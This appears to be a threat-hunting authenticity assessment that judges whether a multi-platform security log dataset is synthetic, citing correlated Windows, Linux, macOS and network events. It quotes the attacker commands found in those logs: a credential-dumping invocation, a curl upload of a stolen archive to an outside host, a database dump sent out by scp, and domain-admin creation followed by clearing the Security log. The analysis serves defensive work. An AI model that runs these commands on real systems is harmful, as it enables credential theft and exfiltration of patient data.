# Threat Hunter — Authenticity Assessment

## Verdict

**Assessment:** Inconclusive
**Verdict Confidence:** 78
**Synthetic-Confidence Score:** 45

## Executive Summary

The supplied slice supports technically coherent investigations across Windows, Linux, macOS, and network telemetry; the strongest suspicious activities survive account, process, session, and transport pivots. Repeated shell-driven document access and some generic administration/file vocabulary suggest constructed behavior, but I did not establish a hard contradiction sufficient to distinguish a sophisticated synthetic dataset from a selectively collected production slice.

## Evidence For Synthetic

- [distribution_texture] On `MAC-MROSS-02.meridianhcs.local`, seven of the nine normalized `FILE/READ` records concern PDF, XLSX, or DOCX documents, and all seven are associated with `/bin/cat`. Native Endpoint Security EXEC records independently show these commands: `project-plan.pdf` at `13:37:11.223221Z`, `service-review.xlsx` at `16:05:48.670374Z`, `project-plan.docx` at `17:10:43.520711Z`, `onboarding.docx` at `17:12:27.399937Z`, `draft-draft.pdf` at `18:37:47.001397Z`, `project-plan-review.docx` at `18:42:07.534517Z`, and `meeting-notes.docx` at `18:44:51.350352Z`. Repeatedly dumping binary office documents to a terminal is possible, but this concentration resembles a generic file-read action applied without regard to file type. This is a behavioral distribution concern, not an impossible command or an inference that uncollected GUI reads never occurred.
- [weak_signal] Administrative shell activity on both Macs repeatedly draws from a narrow discovery vocabulary: `id`, `uname -a`, `sw_vers -productVersion`, `ps aux`, `df -h`, and `find ... -maxdepth 2 -type f -name '*.pdf'`. For example, the second Mac executes the PDF search at `14:28:15.758143Z`, `15:38:27.266627Z`, and `18:24:12.878060Z`; the first Mac executes the same search form at `17:27:09.627232Z`. These are valid commands and could reflect one administrator's habits, so this receives little independent weight.
- [weak_signal] Several Linux clients use conspicuously interchangeable SMB document/policy vocabulary. Examples in `APP-INT-01.meridianhcs.local/ecar.json` include `smbclient` retrieval of `SYSVOL/Scripts/2027/policy-draft.xml` at `13:37:06Z`; `WS-OHADDAD-01.meridianhcs.local/ecar.json` includes `NETLOGON/Policies/startup-draft.ps1` at `13:23:12Z` and `NETLOGON/Scripts/2023/gpt-final.ini` at `13:24:31Z`. These are explicit manual `smbclient` operations, so arbitrary share contents are technically possible; I do not mistake them for demonstrated malformed automatic Group Policy retrieval. The repeated filename texture is only a weak construction clue.

## Evidence For Real

- A difficult Windows identity distinction is preserved. On `WS-AJOHNSON-01`, Security 4648 at `18:00:45.3750825Z` records Aisha supplying Marcus's credentials; 4624 at `18:00:45.6482591Z` creates Type 9 session `0x27c990f` with local `TargetUserName=aisha.johnson` and `TargetOutboundUserName=marcus.chen`. Subsequent local PowerShell processes remain Aisha, while `FILE-SRV-01` sees Marcus authenticating from Aisha's workstation at `18:01:14.8103044Z` and accessing Finance files. Different local and remote principals are explained by visible credentials rather than contradictory attribution.
- Mac-to-Mac SSH has credible phase separation. Zeek UID `CqTSExGpbbbpnpB4Yv` opens `10.10.1.41:62896 -> 10.10.1.42:22` at `14:24:27.752520Z`; the target logs keyboard-interactive/PAM success at `14:24:38.748958Z`, then a user shell at `14:24:38.914909Z`. The return-direction SSH session later uses public-key authentication and a different source port, matching the client `ssh -tt` command.
- Linux transfer evidence supports the observed actions. `DB-PROD-01` creates a database dump, compresses it, and starts `scp`; `APP-INT-01` records the matching root SSH acceptance and destination file before a subsequent `smbclient` upload to `FILE-LNX-01`. The user, source/destination IPs, file path, and sequence are mutually compatible.
- The network background is heterogeneous rather than entirely successful TCP. Across the three Zeek connection files there are 23,088 rows. `zeek-core` alone includes 1,629 `S0`, 166 `RSTO`, 102 `RSTR`, 40 `REJ`, and multiple partial states, alongside DNS, Kerberos, LDAP, SMB, HTTP, TLS, ICMP, and syslog traffic.
- Source semantics are differentiated: shell histories retain command text, macOS Endpoint Security records distinguish fork/exec/exit and audit identities, Unified Log carries selected login/policy/SSH messages, and normalized eCAR adds a different representation. A macOS policy message about MeetingAssist is not followed by a demonstrated successful MeetingAssist execution in the reviewed native ES records.
- Automated consistency checks found no image/PID mismatch against visible Sysmon process GUIDs and no dependent Sysmon activity before a matching visible process creation or after its visible termination. Equivalent checks of normalized process actors found no effects more than one second after a matching visible termination, and the Mac native ES records showed no events attributed to a PID after its visible exit.

## Detailed Analysis

### Orientation, collection scope, and hunting approach

The data covers approximately `2026-11-02 13:00–19:00 UTC` across 23 endpoint host directories: ten with Windows Security/Sysmon, eleven with Linux-style syslog, and two with macOS Endpoint Security/Unified Log. Network collection includes three Zeek locations, two Snort locations, a perimeter ASA log, a proxy access log, and external-web access logging. There are 37,911 normalized eCAR records. I used normalized records to identify pivots and checked important behavior against native endpoint and network records.

Volumes differ by role. The two domain controllers have 6,274 and 5,560 Security events; the proxy has 4,578 access rows. The Mac native ES files contain 150 and 176 records, while their Unified Log exports contain three and two selected messages. These small Mac exports do not establish an exhaustive collection profile. I therefore do not score missing macOS event families, GUI reads, prompts, or unlogged background activity as authenticity defects.

The six-hour boundary matters. Initial process/session state and unmatched terminal records may belong to activity outside the slice. I required a matching visible identifier with contradictory visible ordering before treating lifecycle evidence as impossible.

### Windows credential use, collection, and exfiltration

On Aisha's workstation, normalized process creation at `16:52:02Z` shows `ms-index-service.exe "privilege::debug" "sekurlsa::logonpasswords" exit`, a clear credential-theft pivot. Later `runas.exe /netonly /user:marcus.chen "cmd.exe /d /q"` appears at `18:00:42Z` in eCAR. The native Security records provide the explicit-credential and NewCredentials evidence described above.

At `18:01:16.151Z`, Sysmon records PowerShell enumerating and copying Finance documents under the new local session, with parent PID 6816. Server-side Security 5145/4663 then places Marcus on `FILE-SRV-01` accessing `Q1/FY24` files from `10.10.1.35`. For example, 5145 at `18:01:20.2194394Z` and 4663 at `18:01:20.3580978Z` refer to `Q1-board-pack.pdf` under session `0xf885bf8`. This is a feasible credential-use pivot: the outbound identity changes while the workstation process identity does not.

Sysmon shows `Compress-Archive` at `18:01:44.108Z`, and later `curl.exe --proxy http://10.10.3.20:8080 -F "archive=@C:\ProgramData\Microsoft\cache_7f3a.zip;type=application/zip" https://api.westbridge-services.net/upload/telemetry/7f3a2b19` at `18:25:17.569Z`. Proxy access row 4054 records the POST at `18:25:22Z`, status 200, `cs_bytes=18783258`, user Aisha, client source port 61072, and an inspected TLS tunnel. The Zeek core CONNECT record uses that source port and `curl/8.4.0`. This supports an operationally plausible exfiltration investigation without requiring encrypted application content to be visible in a passive CONNECT-only record.

On `DC-01`, visible commands add `svc_dirsync` to the domain and Domain Admins at approximately `17:15Z`, establish a service/task near `17:19Z`, execute encoded PowerShell and clear Security at `18:42Z`, then delete the account at `18:50Z`. These actions are suspicious on their merits. Their sequence's completeness is not an authenticity indicator.

### Linux database and file-transfer chain

`DB-PROD-01/ecar.json` records root's SSH login from `10.10.2.30` at `18:15:03.466Z`, shell PID 1088964 at `18:15:04.876Z`, and `mysqldump --single-transaction ehr patients insurance_claims` at `18:15:12.864Z`. The dump file is created while that process is alive. `gzip -9 /tmp/rpt_0318.sql` starts at `18:15:43.225Z`, and `scp /tmp/rpt_0318.sql.gz root@10.10.2.30:/tmp/.cache/rpt_0318.sql.gz` starts at `18:16:14.006Z`.

On APP-INT-01, syslog records connection from `10.10.4.10:53518` at `18:16:21.947641Z`, public-key success at `18:16:23.331533Z`, PAM session opening, and logind session 351. Normalized file creation at the destination follows at `18:16:51.227Z`; the server process and session then close. At `18:18:51.984Z`, another root shell invokes `smbclient` as `svc_mhsync` to upload that same path to `ClinicalResearch/Integration/DB-Staging/rpt_0318.sql.gz`. FILE-LNX-01 then records SMB authentication for `svc_mhsync` from APP-INT-01 and the server-side write. Local root and remote directory service credentials need not share a principal.

### macOS authentication and execution boundaries

The first Mac's `connector-check.sh` download is visible as native ES execution of Homebrew curl at `14:00:45.212308Z`, followed by proxy GET status 200 at `14:00:48Z` and normalized destination-file creation. Actual script execution is independently visible at `14:01:04.079625Z`, when `/bin/bash` receives the script path and `--check-config`. Thus the inference of execution does not rest on a download alone.

For the `.41 -> .42` SSH session, the target's native process chain includes xpcproxy, sshd-keygen-wrapper, sshd, sshd-session, sshd-auth, and the eventual user zsh. The observed transport precedes authentication. The reverse session uses `.42:53362 -> .41:22`, Zeek UID `C4ZfopiJXvU28JX8bA`, opening at `16:02:00.857717Z`; the first Mac logs public-key acceptance at `16:02:06.270473Z` and shell execution at `16:02:06.440808Z`. Normalized inbound FLOW precedes normalized USER_SESSION LOGIN in both directions.

The Unified Log policy message at `15:42:09.009673Z` names MeetingAssist and says security policy would not allow the process. I do not claim this proves a specific prompt response or every possible effect. The visible data does not demonstrate successful MeetingAssist execution, and it does not justify attributing unrelated later commands to that application.

The main concern here is behavioral texture: seven binary-document reads through `cat` on the second Mac. This is observable and reproducible, but it remains possible behavior rather than a broken technical prerequisite.

### Consistency checks and limits

I parsed all ten Sysmon XML exports, including 936 process-create records. For GUIDs with a visible creation, the checked image/PID references agreed. No checked Sysmon dependent event preceded that process's creation or followed its visible termination. Normalized process-actor checks and Mac native exit checks likewise produced no material post-exit contradiction. Zeek payload-byte counts did not exceed corresponding IP-byte totals in the scanned connection rows.

These results support internal coherence, not proof of production origin. They also do not certify every protocol field or every record. I did not consult external host inventories, software-version assumptions, scenarios, ground truth, or other reviewers. Domain names and their real-world routing were not used as authenticity evidence.

## Synthetic Indicator Summary

| Category | Affected source family | Scope | Effect on score |
|---|---|---|---|
| distribution_texture | macOS native ES plus normalized file records | Seven of nine FILE/READ records on MAC-MROSS-02 are binary-document reads using cat | Main upward influence; suggests a generic action pool, but is operationally possible |
| weak_signal | macOS ES and shell histories | Repeated discovery/search command forms on both Macs | Small upward influence; one administrator's habits could explain it |
| weak_signal | Linux normalized process records | Repeated generic SMB policy/document filenames across several clients | Small upward influence; explicit manual commands permit arbitrary paths |
| No demonstrated hard contradiction | Windows, Linux, macOS, network pivots examined | Identity and visible lifecycle checks plus selected transfer/authentication chains | Keeps the score in the inconclusive range and prevents a confident Synthetic verdict |

## Realism Score by Category

- **Field format accuracy:** 9 — Parsed source records and inspected native process/authentication fields are credible; no demonstrated source-native schema contradiction.
- **Temporal patterns:** 8 — Checked visible process lifecycles and sampled SSH/transfer sequences preserve prerequisites and effects; the bounded window limits broader conclusions.
- **Cross-source correlation:** 9 — NewCredentials, SMB attribution, proxy tunneling, SSH, and SCP pivots remain technically coherent.
- **Behavioral realism:** 6 — Intrusion commands are feasible, but repeated cat reads of office documents and narrow shell vocabularies feel constructed.
- **Environmental consistency:** 8 — Source mixes fit the visible domain, server, proxy, and endpoint roles; collection scope remains partly unspecified.

## Recommendations

- If this were synthetic, choose file-access tools according to the observed file type. The seven binary-document cat executions on MAC-MROSS-02 would be more convincing as a smaller number of deliberate raw-data inspections, or as application/utility executions appropriate to the documents being accessed.
- If this were synthetic, diversify the demonstrated administration vocabulary according to the actual user and host task. Preserve legitimate repeated commands, but give the repeated PDF searches and generic SMB filenames a concrete operational reason rather than broad interchangeability.
- Retain the observed distinction between local process identity and outbound credentials, and retain the transport/authentication/shell separation demonstrated by SSH. These details materially support hunting feasibility and should survive any changes to behavioral texture.
